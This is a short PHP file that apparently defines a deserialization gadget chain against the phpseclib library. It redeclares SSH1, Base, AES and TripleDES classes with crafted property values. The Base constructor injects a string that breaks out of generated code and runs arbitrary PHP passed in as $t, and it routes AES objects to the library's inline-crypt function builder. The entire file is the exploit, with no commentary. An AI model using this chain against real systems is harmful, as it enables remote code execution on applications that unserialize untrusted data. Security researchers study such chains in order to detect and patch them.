<?php

namespace phpseclib\Net
{
    class SSH1
    {
        var $bitmap = 1;
        var $crypto;
        public function __construct($a)
        {
            $this->crypto = $a;
        }
    }
}

namespace phpseclib\Crypt
{
    class Base
    {
        var $block_size;
        var $inline_crypt;
        var $use_inline_crypt = 1;
        var $changed = 0;
        var $engine = 1;
        var $mode = 1;

        public function __construct($t)
        {
            if (strpos(get_class($this), 'AES'))
                $this->inline_crypt =  [$t, '_createInlineCryptFunction'];
            else
                $this->block_size = '1){}}}; ob_clean();' . $t . 'die(); ?>';
        }
    }

    class AES extends Base
    {
        var $bitmap = 1;
        var $crypto = 1;
    }

    class TripleDES extends Base
    {
    }
}
